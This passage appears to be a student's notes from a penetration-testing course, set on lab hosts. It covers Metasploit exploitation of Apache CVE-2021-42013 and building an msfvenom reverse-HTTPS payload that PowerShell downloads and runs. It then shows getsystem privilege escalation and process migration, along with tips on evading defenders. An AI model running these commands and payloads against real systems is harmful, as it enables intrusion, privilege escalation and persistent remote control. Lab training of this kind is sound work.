+<h1>[<em>] Uploading  : /usr/bin/unix-privesc-check -&gt; /tmp/unix-privesc-check
+[</em>] Completed  : /usr/bin/unix-privesc-check -&gt; /tmp/unix-privesc-check
+meterpreter &gt; ls /tmp
+Listing: /tmp</h1>
+<p>Mode              Size     Type  Last modified              Name</p>
+<hr>
+<p>100755/rwxr-xr-x  1068672  fil   2023-11-21 07:50:12 -0800  NbyT
+100644/rw-r--r--  36801    fil   2023-11-21 08:35:19 -0800  unix-privesc-check</p>
+<p>meterpreter &gt;</p>
+<pre><code>- Successful upload.
+- If our target runs Win OS, we need to escape backslashes in dest path like `\\`
+
+We used `linux/x64/meterpreter_reverse_tcp` payload in this section, before moving on we will explore another 64-bit Linux Meterpreter payload.  Exit the current session and use `show payloads` in the context of the exploit module again.
+</code></pre>
+<p>meterpreter &gt; exit
+[*] Shutting down Meterpreter...</p>
+<p>[*] 192.168.250.16 - Meterpreter session 2 closed.  Reason: User exit
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show payloads </p>
+<h1>Compatible Payloads</h1>
+<h1>Name                                              Disclosure Date  Rank    Check  Description</h1>
+<hr>
+<p>...
+   12  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline</p>
+<pre><code>- This payload uses HTTPS to establish connection and comm.
+ - Encrypted with SSL/TLS.
+ - Defenders will only see info about HTTPS requests.
+  - Without further defensive tech the will be unlikely to decipher the Meterpreter comms.
+
+Select the payload and display its options.
+</code></pre>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set payload 12
+payload =&gt; linux/x64/meterpreter_reverse_https
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show options</p>
+<p>Module options (exploit/multi/http/apache_normalize_path_rce):</p>
+<p>   Name       Current Setting  Required  Description</p>
+<hr>
+<p>   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-4
+                                         1773, CVE-2021-42013)
+   DEPTH      5                yes       Depth for Path Traversal
+   Proxies                     no        A proxy chain of format type:host:port[,type:h
+                                         ost:port][...]
+   RHOSTS     192.168.250.16   yes       The target host(s), see <a href="https://docs.metasploi">https://docs.metasploi</a>
+                                         t.com/docs/using-metasploit/basics/using-metas
+                                         ploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cgi-bin         yes       Base path
+   VHOST                       no        HTTP server virtual host</p>
+<p>Payload options (linux/x64/meterpreter_reverse_https):</p>
+<p>   Name   Current Setting  Required  Description</p>
+<hr>
+<p>   LHOST  192.168.45.182   yes       The local listener hostname
+   LPORT  8443             yes       The local listener port
+   LURI                    no        The HTTP Path</p>
+<p>Exploit target:</p>
+<p>   Id  Name</p>
+<hr>
+<p>   0   Automatic (Dropper)</p>
+<p>View the full module info with the info, or info -d command.</p>
+<pre><code>- There is an additional option `LURI`
+ - This can be used to leverage a single listener on one port.
+  - Capable of handling diff requests based on path in this option.
+  - Provides logical separation.
+  - If left blank it defaults to `/`
+
+Launch the exploit by entering run, wihtout setting a `LURI` value.
+</code></pre>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; run</p>
+<p>[<em>] Started HTTPS reverse handler on <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a>
+[</em>] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] <a href="http://192.168.250.16:80">http://192.168.250.16:80</a> - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
+[<em>] Scanned 1 of 1 hosts (100% complete)
+[</em>] <a href="http://192.168.250.16:80">http://192.168.250.16:80</a> - Attempt to exploit for CVE-2021-42013
+[<em>] <a href="http://192.168.250.16:80">http://192.168.250.16:80</a> - Sending linux/x64/meterpreter_reverse_https command payload
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAqTx730zfoSrsACFYoW5fjwzxvgdHXnGod4d7eqqmNkyDHTs7kMQcYHe3EosUW6XcWLB5PFpu80SJpjF0EfuM03_L3AVlE with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAwJQvUsTeawiHJ1B-friDYPN2vMJcTRkKI-6DlB5jIsY2InArKsI9U1o49Vnqhx-sk0YUDWkeZBSm63S8LEH8LiNS with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAo3G6LOwsFINkC_M8Qczhp9j8VhlKHsZCT1icQUJGBzk-T9PM-rllg2SkBFGeuGL2RDNwDoIL with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAnRUu-z-CCHMIDsui3rn8KPEnB5Y24YK8ZRw77FGRq7nMQdHF3cUF8LcVKOa5FZUTMuSORtQPE8ibvgC7-DXg-fBFgW-gm3 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAOgRr3AYHMIuOIq3xdvt1NmMKXDaoh-33EodMKiEhvYg1uUuSM700PQCo2_yRPM899ClfSEt0AYC56z7_yvWlp4NiN6L with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAFwxcCSHDgeH3aZh5ZNm3hVOK5SrupKHyEG-KJGLqhS4GiGxAvwEbL17OqshOlOlcdy8 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAgGDsL4_c5h-AHMD6Jp9qP_LZVUVq8WRysdmZ21gEg9oEuXIZh7P with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDApPBBxRgKbCcQVsCTT5G1yEjtuGSLqtPSm9fPdMfbI0OddBCPH6iLlVbYUbJciBLn_gDnO3AnmOve3RqNr9bc6e2GJXLgoh1KvDZ6 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAQhFSLj6hnOejbYWCEoXZVlbmLvjOjIHX8IV-xsRnPzltuISuKMWcXH6pLNI with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAR5SYiee7fbnbdzJ5koUc1TYAEp0AggZKxEeIaF0Y643wXYLbPE94j2n-LmVyD6AhsrFPkzoGVm3ts4Ad4LNm5hMCUk0Nf with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDA4Q4uQOPdpZYzCwAx1OKrhAxrSlrAY1ZCaMrbijDbT9tQNkPEhQcjcHcPu7MjVJFlw with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQzD0b8aNBi9gxkqcnY116_liHreCOZRfTKtuWxe5o6YhMxBEBFgz46G3KpQf-d9aCsJaehL with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQ5_EKfAHV01yJqCe-QzMErK5_-MQmz8drn33VvlWloS2o3BGzxOKtm9WDGZ7QLPLB3QF7pN_OY4tdHj6aG1Op787iFRIhAcAiUtkql7BQ with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQbO9IRRzu0QO-tMG8GEiZD with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQax0xSdo0QMoVbWqP72-OzspMIeMPOsD8kVxJ1oPOoPzciLsZhfxFvJ6hC0ZPj_sCZusggjdbDhqm4ZG8v6iF0DPqMmNHbFLys7H1bMn with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQ-fep7hPJht-qfOydgyKicLb-gahgWdAplEru2J with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQkfY3N8Yny-CoUBUsWhQ8u9jov91hZzBEEatT_902oVw_EG4 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQ_O8k5BmO1_AqBt_0I28vHSUubmOpTjmg8Y8tHa7K_wGhwCffj with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQT0FDKsdgRv7 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQRJyMNQhfSUwBMmztgdzAQyAjscdwMDNFw1E with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQOXpp4ozPQEJ6EKbPfvrpuGIRzbXwmyoXYxQVWx9oa2dZSsjCtPdi78g7mmdNq0RISDMTN2cwOjcEY_A2hJBLIpnDpXO8MWGQAD_MuYq with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgDPHLdPoMhEJnirOLRuAtP3CQBqzMpU_hDFF_z_Mb7uvUOrHnOtaoKUxxJy-ZymKXvZUpHTzFpKxNT-lUwCLwau33fbhfGL4Juvr38 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgPaHNE6YMDpGuvFDIPjb26MQg5lyvTui5GDm_X7B2aG7IcoivJZzcBK5-0bXx6B41 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAg5oWjPb7WuceRa4-qbWFUAoRMy with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgC_911F with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgyiDXgXWm8yiqgEbvJU8jkN4CIR068EW60YHqvo1FMDjIDxy6X7BqyI_Gt5tJyYfpQPlo0ecRX2E2pDw1VWHy3- with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgRrx-aVGtC9wAd92l77uUxZ8hdH-V8KFbr08B4ycKkPxXOapGLrV5fSc1lscs5JlbU-lfxWjEn1u9tNQgyHnYbLe with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAg6vP9YsLhi4HbqEBe1k6piv62VQhAXpbjsNkEDPz7O3EHpck7QjqZJR95ooC67aGUZ_zCeNxRgRJExXFPAcl_zxf with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgfavQNTnmL6d-8p3ZGZKZ6KmPxob6MEMsICO with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAg9cpXnnAqarXsLgNGM8sqVGUgD6GNqjNsXi-z8nukTBVSGDnceMtmx6E9eJKveMqfOL10GbWeMvFRz0ZQ8XjhBH with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgrjfc4vmMtrF8wPvwipLVY1a44IYD-gRF1DLrEBce with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAwsQBkokFKilqmmtLfqj3z09Pj24-Xol-GPJ8MmLlbWIFx1ETBiDQJQLM3PVBFoO5NqChBj7j3sltMq0aQnY2 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAwnCQMPU-bR9EIOwrCcLNXIh7OPYBVVTH840SFIuUAkV8OHPMG1iCMNaGn05V9q-IdBcc4jpdvjK7OzwtjIjdZHI-4A5 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAwKgKC97_xft5izfpw3wsLD with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[</em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAw-jHwOffIwagr9ey0YcFd0uOBRt3AYacHdPmOguUhUA-a6qY47Jemj6q8Tj4RE with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#39;
+[<em>] <a href="https://192.168.45.182:8443">https://192.168.45.182:8443</a> handling request from 192.168.250.16; (UUID: lkzu2yrq) Attaching orphaned/stageless session...
+[</em>] Meterpreter session 3 opened (192.168.45.182:8443 -&gt; 192.168.250.16:42094) at 2023-11-21 08:43:46 -0800
+[!] This exploit may require manual cleanup of &#39;/tmp/hWykqBce&#39; on the target</p>
+<p>meterpreter &gt;</p>
+<pre><code>- Various events are handled until the Meterpreter session is established.
+ - A monitoring defender would ony see regular HTTPS traffic.
+ - If they were to check the address of the endpoint (Kali), they would get a HTTP 404.
+
+In a pentest, we can use this payload to improve our chances of bypassing security technologies and defenders.  However, MSF is well known and detection rates of Meterpreter payloads are high.  Therefore we should always attempt to obtain an initial foothold with a raw TCP shell and deploy Meterpreter shell once we have disabled or bypassed security technology.
+
+##### XAMPP Default Passwords ###
+
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+
+2) FileZilla FTP:
+
+   [ You have to create a new user on the FileZilla Interface ] 
+
+3) Mercury (not in the USB &amp; lite version): 
+
+   Postmaster: Postmaster (postmaster@localhost)
+   Administrator: Admin (admin@localhost)
+
+   User: newuser  
+   Password: wampp 
+
+4) WEBDAV: 
+
+   User: xampp-dav-unsecure
+   Password: ppmax2011
+   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
+   For activation please comment out the httpd-dav.conf and
+   following modules in the httpd.conf
+   
+   LoadModule dav_module modules/mod_dav.so
+   LoadModule dav_fs_module modules/mod_dav_fs.so  
+   
+   Please do not forget to refresh the WEBDAV authentification (users and passwords).     
+
+5) SuperPassword (For everything):
+   User: mountainadmin
+   Password: OS{bf12259a466c7e76928a797bc1f7e508}
+   Attention: This user can do everything in our company.. Use with care!
+</code></pre>
+<h4>20.3 Performing Post-Exploitation with Metasploit</h4>
+<ul>
+<li>Use core Meterpreter post-exploitation features.</li>
+<li>Use post-exploitation modules.</li>
+<li>Perform pivoting with Metasploit.</li>
+</ul>
+<h5>Core Meterpreter Post-Exploitation Features</h5>
+<p>We used Meterpreter payloads to navigate the FS in the prior section, obtaining info about the target sys, and transftering files to/from our attacking machine.  Apart from these, Meterpreter also contains numerous post-exploitation features.</p>
+<p>Let&#39;s explor these features, note that the Linux Mterpreter payload contains less post-exploitation features than the Windows version.  Therefore we will explore these on Win target ITWK01.  Let&#39;s assume we already gained an initial foothold on the target system and deployed a bind shell to access the system.</p>
+<p>First, we&#39;ll create a Win bin with msfvenom containing a non-staged Meterpreter payload names <code>met.exe</code></p>
+<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
+└─$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 201820 bytes
+Final size of exe file: 208384 bytes
+Saved as: met.exe
+</code></pre>
+<p>Then we launch multi/handler, set options, and run.</p>
+<pre><code>msf6 exploit(multi/handler) &gt; set LPORT 443
+LPORT =&gt; 443
+msf6 exploit(multi/handler) &gt; set LHOST 192.168.45.182
+LHOST =&gt; 192.168.45.182
+msf6 exploit(multi/handler) &gt; show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter_reverse_https):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   EXITFUNC    process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, pr
+                                          ocess, none)
+   EXTENSIONS                   no        Comma-separate list of extensions to load
+   EXTINIT                      no        Initialization strings for extensions
+   LHOST       192.168.45.182   yes       The local listener hostname
+   LPORT       443              yes       The local listener port
+   LURI                         no        The HTTP Path
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started HTTPS reverse handler on https://192.168.45.182:443
+</code></pre>
+<p>Next we start a Python3 web server, serve <code>met.exe</code>, conn to our bind shell, download our mal exe with PowerShell, and start the bin.</p>
+<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
+└─$ nc $IT 4444 
+Microsoft Windows [Version 10.0.22000.1219]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\luiza&gt;powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\luiza&gt; iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
+iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
+PS C:\Users\luiza&gt; .\met.exe
+.\met.exe
+PS C:\Users\luiza&gt;
+</code></pre>
+<p>Metasploit notifes us that a new session has been opened.</p>
+<pre><code>[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: 7unirfs7) Redirecting stageless connection from /rFTB8XlDRXgroSqjTv68pQG2EEFr with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
+[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: 7unirfs7) Attaching orphaned/stageless session...
+[*] Meterpreter session 1 opened (192.168.45.182:443 -&gt; 192.168.226.223:52494) at 2023-11-23 10:16:41 -0800
+
+meterpreter &gt;
+</code></pre>
+<p>Now that we have an active Meterpreter session on a Win target we can start exploring our port-exploitation commands/features.</p>
+<p>The first post command we use is <code>idletime</code>, which displays how long a user has been idle.  After obtaining basic info about the current user and OS, this should be one of our first commands as it indicated if the target sys is currently in use.</p>
+<pre><code>meterpreter &gt; getuid
+Server username: ITWK01\luiza
+meterpreter &gt; sysinfo
+Computer        : ITWK01
+OS              : Windows 10 (10.0 Build 22000).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 3
+Meterpreter     : x64/windows
+meterpreter &gt; idletime 
+User has been idle for: 26 mins 21 secs
+meterpreter &gt;
+</code></pre>
+<p>The output states that the user has not interacted with the sys for over 26 min, suggesting they stepped away from their computer.  If the results of idletime indicated the user is away, we can take this as an opportunity to exec programs or commands which may display a cli-window, CMD or PS, for a moment.</p>
+<p>Several post-exploitation features need admin privs to exec, Metasploit contains a <code>getsystem</code> command, that attempts to auto PrivEsc to NT AUTHORITY\SYSTEM.  It utlizes various techniques using named pipe impersonation and token duplication.  In default settings, <code>getsystem</code> uses all available techiniques shown in the help menu, attempting to leverage SeImersonatePrivilege and SeDebugPrivilege.</p>
+<p>Before we exec <code>getsystem</code> let&#39;s start an interactive shell and confirm that our user has one of those two privs assigned.</p>
+<pre><code>meterpreter &gt; shell
+Process 1264 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.22000.1219]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\luiza&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+C:\Users\luiza&gt;exit
+exit
+meterpreter &gt;
+</code></pre>
+<ul>
+<li>User <code>luiza</code> has SeImpersontePrivilege assigned.</li>
+</ul>
+<p>Now let&#39;s use <code>getsystem</code> to attempt to elevate our privs.</p>
+<pre><code>meterpreter &gt; getuid
+Server username: ITWK01\luiza
+
+meterpreter &gt; getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre>
+<ul>
+<li><code>getsystem</code> elevated our privs to NT AUTHORITY\SYSTEM by using Named Pipe Impersonation (Print Spooler variant) as we did manually in the Windows Privilege Escalation Module.</li>
+</ul>
+<p>Another important post module feature is <code>migrate</code>.  When we compromise a host, our Meterpreter payload is executed inside the process of the application we attack or exec our payload.  If the victim stops that process we loose our access to the machine.  Also, depending on how the binary file containing the Meterpreter payload is named, the proc may appear suspiscious to a defender searching through proc list.  We can use migrate to move the execution of our Meterpreter payload to a different proc.</p>
+<p>We can view all running procs with <code>ps</code> in the Meterpreter prompt.</p>
+<pre><code>meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name                         Arch  Session  User                          Path
+ ---   ----  ----                         ----  -------  ----                          ----
+ 2012   8500  met.exe                      x64   0        ITWK01\luiza                  C:\Users\luiza\met.exe 
+... 
